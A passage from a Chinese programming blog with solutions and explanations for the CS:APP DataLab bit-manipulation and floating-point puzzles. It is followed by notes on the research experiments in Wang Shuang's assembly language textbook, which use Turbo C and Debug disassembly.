&lt;&lt; <span class="number">31</span>) &amp; x) &gt;&gt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>divpwr2<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过15个操作符求出x/(2^n)的结果，其中0&lt;=n&lt;=30。<br>  分析：对于正数，直接使用算术右移即可；对于负数，需要加上适当的偏移量以实现向上舍入，这可以用根据符号位生成1个全0或者全1的掩码来控制。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* add bias when x is negative, which is controlled by a sign-related mask */</span></span><br><span class="line">	<span class="keyword">int</span> mask = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">	<span class="keyword">int</span> add = ((<span class="number">1</span> &lt;&lt; n) + (~<span class="number">1</span>) + <span class="number">1</span>) &amp; mask;</span><br><span class="line">	<span class="keyword">return</span> (x + add) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>negate<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过5个操作符求出x的负数。<br>  分析：-x = (~x + 1)<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* -x = (~x) + 1 */</span></span><br><span class="line">	<span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>isPositive<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过8个操作符判断x是否为正数。<br>  分析：对于正数，它的最高位一定是0，同时还要排除0的影响。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* ensure the highest bit is 0 and x != 0 */</span></span><br><span class="line">	<span class="keyword">return</span> (!(x &gt;&gt; <span class="number">31</span>)) ^ (!(x ^ <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>isLessOrEqual<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过24个操作符判断x是否小于或等于y。<br>  分析：<br>  对于这个问题，我们需要按照是否溢出，以及x与y的符号分别讨论。<br>  最基本的思路是，做y-x，若结果的符号位为1，则返回0，反之返回1。但这样就忽略了溢出可能导致的问题，现在我们做如下考虑。<br>  若x，y均为正数，或x，y均为负数，则y-x绝不可能溢出，因此可直接用差的符号位判断大小。<br>  若x为正数，y为负数，可以直接返回0。<br>  若x为负数，y为正数，可以直接返回1。<br>  我们可以生成两种条件变量，一种为x，y同号时返回正确结果的条件变量，另一种为x，y异号时返回正确结果的条件变量。<br>  对于x，y同号和异号这两种不同的情况，我们可以用!((x ^ y) &gt;&gt; 31)生成掩码使得在任意的情况下，只有正确的条件变量生效。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* different processing ways when x and y have the same signs or different signs */</span></span><br><span class="line">	<span class="keyword">int</span> diff = y + (~x) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> not_diff_sign = !(diff &gt;&gt; <span class="number">31</span>);</span><br><span class="line">	<span class="keyword">int</span> mask = !((x ^ y) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">	<span class="keyword">int</span> result_not_overflow = mask &amp; not_diff_sign;</span><br><span class="line">	<span class="keyword">int</span> result_overflow = (!mask) &amp; (x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">	<span class="keyword">return</span> result_overflow | result_not_overflow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>ilog2<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过90个操作数求出x以2为底的对数（向下舍入），保证x&gt;0。<br>  分析：<br>  这道题参考了网上的答案。核心的思想是二分查找。<br>  首先将x右移16位，如果x&gt;0，则表明结果的第5位为1，将该位置为1。<br>  然后根据结果将x右移8位（第5位为0）或者将x右移24位（第5位为1），如果x&gt;0，则表明结果的第4位为1，将该位置为1。<br>  以此类推，直到得出结果。<br>  答案：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* Binary Search */</span></span><br><span class="line">	<span class="keyword">int</span> result = (!!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">	result = result + ((!!(x &gt;&gt; (result + <span class="number">8</span>))) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">	result = result + ((!!(x &gt;&gt; (result + <span class="number">4</span>))) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">	result = result + ((!!(x &gt;&gt; (result + <span class="number">2</span>))) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">	result = result + (!!(x &gt;&gt; (result + <span class="number">1</span>)));</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="第三部分-浮点数操作"><a href="#第三部分-浮点数操作" class="headerlink" title="第三部分 浮点数操作"></a>第三部分 浮点数操作</h3><ul>
<li><p>float_neg<br>  问题：返回对于浮点数参数f，-f的等价的位级表示。当参数位NAN时，返回NAN。函数的参数和返回值均为unsigned，但它们实际上都是浮点数的位表示。最多允许使用10个操作符。<br>  分析：首先要判断参数是否是NAN，如果是则直接返回，否的话直接将参数的最高位取反即可。<br>  NAN的阶码全为1，尾码不全为0。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* m_flag - if m != 0 e_flag - if e == 0xff */</span></span><br><span class="line">	<span class="keyword">unsigned</span> m_flag = <span class="number">0x007fffff</span> &amp; uf;</span><br><span class="line">	<span class="keyword">unsigned</span> e_flag = !(<span class="number">0x7f800000</span> &amp; (~uf));</span><br><span class="line">	<span class="keyword">if</span> (e_flag &amp;&amp; m_flag) &#123;</span><br><span class="line">		<span class="keyword">return</span> uf;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0x80000000</span> ^ uf;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>float_i2f<br>  问题：返回(float)x的位级的等价表示。结果被作为unsigned int返回，但它实际上是单精度浮点数的位表示。最多允许使用30个操作符。<br>  分析：<br>  首先考虑到整数中只有0会被转换为非规格化浮点数，而其他整数会被转化为规格化浮点数。因此对于0需要做额外的处理。<br>  其次，对于负数，我们需要将其转化为正数再做处理，这就要求我们需要将x的符号保存下来，并且从补码转化为无符号表示。<br>  然后，我们需要根据转换成无符号数的x算出阶码e和尾码m。<br>  最后，我们将尾码舍入后再和阶码符号一起，生成最终的结果即可。<br>  这里我有一个比较大的误区，舍入的时候看的不仅仅是带舍入位的下一位，而是待舍入位之后的所有位。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* 1.process 0 individually 2.process negative number and store the sign 3.get the e number 4.get the m number and round it 5.construct the result */</span></span><br><span class="line">	<span class="keyword">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> mask = <span class="number">0x80000000</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> sign = x &amp; mask;</span><br><span class="line">	<span class="keyword">unsigned</span> c = <span class="number">0</span>, absx = x;</span><br><span class="line">	<span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			absx = -x;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (!(mask &amp; absx)) &#123;</span><br><span class="line">			count = count + <span class="number">1</span>;</span><br><span class="line">			mask = mask &gt;&gt; <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		absx = absx &lt;&lt; (count + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (((absx &amp; <span class="number">0x1ff</span>) &gt; <span class="number">0x100</span>) || ((absx &amp; <span class="number">0x3ff</span>) &gt;= <span class="number">0x300</span>)) &#123;</span><br><span class="line">			c = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sign + ((<span class="number">158</span> - count) &lt;&lt; <span class="number">23</span>) + (absx &gt;&gt; <span class="number">9</span>)+ c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>float_twice<br>  问题：返回对于浮点数参数f，2*f的等价的位级表示。参数和结果都为unsigned int，但它们实际上是浮点数的位表示。当参数是NAN时，返回NAN。最多允许使用30个操作符。<br>  分析：<br>  对于非规格化浮点数，只要在保留符号位的情况下将尾码m右移一位即可，这样同时解决了尾码乘以二和进位的情况。<br>  对于规格化浮点数，只要将其阶码e加1即可。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* denormailized number - m = m &lt;&lt; 1 normalized number - e = e + 1 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> result = uf;</span><br><span class="line">	<span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">		result = ((uf &amp; <span class="number">0x007fffff</span>) &lt;&lt; <span class="number">1</span>) | (uf &amp; <span class="number">0x80000000</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) != <span class="number">0x7f800000</span>) &#123;</span><br><span class="line">		result = uf + <span class="number">0x00800000</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/04/04/深入理解计算机系统DataLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/03/10/王爽汇编语言第三版综合研究结论/">
                            王爽汇编语言第三版综合研究结论
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-03-10T18:09:01+08:00">
	
		    3月 10, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/汇编/">汇编</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第三部分也是最后一部分（大概），主要是书后的综合研究</p>
</blockquote>
<h2 id="研究试验1-搭建一个精简的C语言开发环境"><a href="#研究试验1-搭建一个精简的C语言开发环境" class="headerlink" title="研究试验1 搭建一个精简的C语言开发环境"></a>研究试验1 搭建一个精简的C语言开发环境</h2><p>TC进行连接需要如下的文件：</p>
<ul>
<li>C0S.OBJ</li>
<li>CS.LIB</li>
<li>EMU.LIB</li>
<li>GRAPHICS.LIB</li>
<li>MATHS.LIB</li>
</ul>
<h2 id="研究试验2-使用寄存器"><a href="#研究试验2-使用寄存器" class="headerlink" title="研究试验2 使用寄存器"></a>研究试验2 使用寄存器</h2><ol>
<li>编一个程序ur1.c <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main ()</span><br><span class="line">&#123;</span><br><span class="line">	_AX = <span class="number">1</span>;</span><br><span class="line">	_BX = <span class="number">1</span>;</span><br><span class="line">	_CX = <span class="number">2</span>;</span><br><span class="line">	_AX = _BX + _CX;</span><br><span class="line">	_AH = _BL + _CL;</span><br><span class="line">	_AL = _BH + _CH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>用Debug加载ur1.exe，用u命令查看ur1.exe编译后的机器码和汇编代码。<br> 思考：main函数的代码在什么段中？用Debug怎样找到ur1.exe中main函数的代码？<br> 回答：main函数的代码在CS段中，需要知道main函数的偏移地址才能找到main函数的代码。</li>
<li>用下面的方法打印出ur1.exe被加载运行时，main函数在代码段中的偏移地址。 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main ()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%x\n"</span>, main);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 思考：为什么这个程序能够打印出main函数在代码段中的偏移地址？<br> 回答：由学过的知识可知，C语言中用指针表示地址，这里的printf打印了main函数的入口地址，也即main函数在代码段中的偏移地址。</li>
<li><p>用Debug加载ur1.exe，根据上面打印出的main函数的偏移地址，用u命令察看main函数的汇编代码。仔细找到ur1.c中每条C语句对应的汇编代码。</p>
 <table><thead><tr><th style="text-align: center">地址</th><th style="text-align: center">汇编语句</th><th style="text-align: center">C语句</th></tr></thead><tbody><tr><td style="text-align: center">076A:01FA</td><td style="text-align: center">PUSH BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FB</td><td style="text-align: center">MOV BP,SP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FD</td><td style="text-align: center">MOV AX,0001</td><td style="text-align: center">_AX = 1</td></tr><tr><td style="text-align: center">076A:0200</td><td style="text-align: center">MOV BX,0001</td><td style="text-align: center">_BX = 1</td></tr><tr><td style="text-align: center">076A:0203</td><td style="text-align: center">MOV CX,0002</td><td style="text-align: center">_CX = 2</td></tr><tr><td style="text-align: center">076A:0206</td><td style="text-align: center">MOV AX,BX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0208</td><td style="text-align: center">ADD AX,CX</td><td style="text-align: center">_AX = _BX + _CX</td></tr><tr><td style="text-align: center">076A:020A</td><td style="text-align: center">MOV AH,BL</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:020C</td><td style="text-align: center">ADD AH,CL</td><td style="text-align: center">_AH = _BL + _CL</td></tr><tr><td style="text-align: center">076A:020E</td><td style="text-align: center">MOV AL,BH</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0210</td><td style="text-align: center">ADD AL,CH</td><td style="text-align: center">_AL = _BH + _CH</td></tr><tr><td style="text-align: center">076A:0212</td><td style="text-align: center">POP BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0213</td><td style="text-align: center">RET</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr></tbody></table>

<p> 注意：在这里，对于main函数汇编代码开始处的“push bp mov bp,sp”和结尾处的“pop bp”，这里只了解到：这是C编译器安排的为函数中可能使用到bp寄存器而设置的，就可以了。</p>
</li>
<li><p>通过main函数后面有ret指令，我们可以设想：C语言将函数实现为汇编语言中的子程序。研究下面程序的汇编代码，验证我们的设想。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	_AX = <span class="number">1</span>; _BX = <span class="number">1</span>; _CX = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_AX = _BX + _CX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译、连接后用Debug查看汇编代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,<span class="number">0001</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0001</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">CX</span>,<span class="number">0002</span></span><br><span class="line"><span class="keyword">CALL</span> 020B</span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,<span class="built_in">BX</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">AX</span>,<span class="built_in">CX</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>
<p>设想正确</p>
</li>
</ol>
<h2 id="研究试验3-使用内存空间"><a href="#研究试验3-使用内存空间" class="headerlink" title="研究试验3 使用内存空间"></a>研究试验3 使用内存空间</h2><ol>
<li><p>编一个程序um1.c：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	*(<span class="keyword">char</span> *)<span class="number">0x2000</span>=<span class="string">'a'</span>;</span><br><span class="line">	*(<span class="keyword">int</span> *)<span class="number">0x2000</span>=<span class="number">0xf</span>;</span><br><span class="line">	*(<span class="keyword">char</span> far *)<span class="number">0x20001000</span>=<span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line">	_AX=<span class="number">0x2000</span>;</span><br><span class="line">	*(<span class="keyword">char</span> *)_AX=<span class="string">'b'</span>;</span><br><span class="line"></span><br><span class="line">	_BX=<span class="number">0x1000</span>;</span><br><span class="line">	*(<span class="keyword">char</span> *)(_BX+_BX)=<span class="string">'a'</span>;</span><br><span class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0x20001000</span>+_BX)=*(<span class="keyword">char</span> *)_AX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 把um1.c保存在C:\MINIC下，编译，连接生成um1.exe。然后用Debug加载um1.exe，对main函数的汇编代码进行分析，找到每条C语句对应的汇编代码；对main函数进行单步跟踪，察看相关内存单元的内容。</p>
 <table><thead><tr><th style="text-align: center">地址</th><th style="text-align: center">汇编语句</th><th style="text-align: center">C语句</th><th style="text-align: center">相关内存单元</th></tr></thead><tbody><tr><td style="text-align: center">076A:01FA</td><td style="text-align: center">PUSH BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FB</td><td style="text-align: center">MOV BP,SP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FD</td><td style="text-align: center">MOV BYTE PTR [2000],61</td><td style="text-align: center">&#42;(char &#42;)0x2000=’a’</td><td style="text-align: center">07C4:2000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0202</td><td style="text-align: center">MOV WORD PTR [2000],000F</td><td style="text-align: center">&#42;(int &#42;)0x2000=0xf</td><td style="text-align: center">07C4:2000-07C4:2001 -&gt; 0F 00</td></tr><tr><td style="text-align: center">076A:0208</td><td style="text-align: center">MOV BX,2000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:020B</td><td style="text-align: center">MOV ES,BX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:020D</td><td style="text-align: center">MOV BX,1000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0210</td><td style="text-align: center">ES:</td><td style="text-align: center"></td><td style="text-align: center"></td></tr><tr><td style="text-align: center">076A:0211</td><td style="text-align: center">MOV BYTE PTR [BX],61</td><td style="text-align: center">&#42;(char far &#42;)0x20001000=’a’</td><td style="text-align: center">2000:1000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0214</td><td style="text-align: center">MOV AX,2000</td><td style="text-align: center">_AX=0x2000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0217</td><td style="text-align: center">MOV BX,AX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0219</td><td style="text-align: center">MOV BYTE PTR [BX],62</td><td style="text-align: center">&#42;(char &#42;)_AX=’b’</td><td style="text-align: center">07C4:2000 -&gt; 62</td></tr><tr><td style="text-align: center">076A:021C</td><td style="text-align: center">MOV BX,1000</td><td style="text-align: center">_BX=0x1000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:021F</td><td style="text-align: center">ADD BX,BX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0221</td><td style="text-align: center">MOV BYTE PTR [BX],61</td><td style="text-align: center">&#42;(char &#42;)(_BX + _BX)=’a’</td><td style="text-align: center">07C4:2000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0224</td><td style="text-align: center">MOV BX,AX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0226</td><td style="text-align: center">MOV AL,[BX]</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0228</td><td style="text-align: center">XOR CX,CX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:022A</td><td style="text-align: center">ADD BX,1000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:022E</td><td style="text-align: center">ADC CX,2000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0232</td><td style="text-align: center">MOV ES,CX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0234</td><td style="text-align: center">ES:</td><td style="text-align: center"></td><td style="text-align: center"></td></tr><tr><td style="text-align: center">076A:0235</td><td style="text-align: center">MOV [BX],AL</td><td style="text-align: center">&amp;#142(char far &#42;)(0x20001000+<em>BX)=&#42;(char &#42;)</em>AX</td><td style="text-align: center">2000:3000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0237</td><td style="text-align: center">POP BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0238</td><td style="text-align: center">RET</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr></tbody></table>
</li>
<li><p>编一个程序，用一条C语句实现在屏幕的中间显示一个绿色的字符”a”。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	*(<span class="keyword">int</span> far *)<span class="number">0xb80007d0</span>=<span class="number">0x261</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>分析下面程序中所有函数的汇编代码，思考相关的问题。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a1, a2, a3;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> b1, b2, b3;</span><br><span class="line">	a1 = <span class="number">0xa1</span>; a2 = <span class="number">0xa2</span>; a3 = <span class="number">0xa3</span>;</span><br><span class="line">	b1 = <span class="number">0xb1</span>; b2 = <span class="number">0xb2</span>; b3 = <span class="number">0xb3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c1, c2, 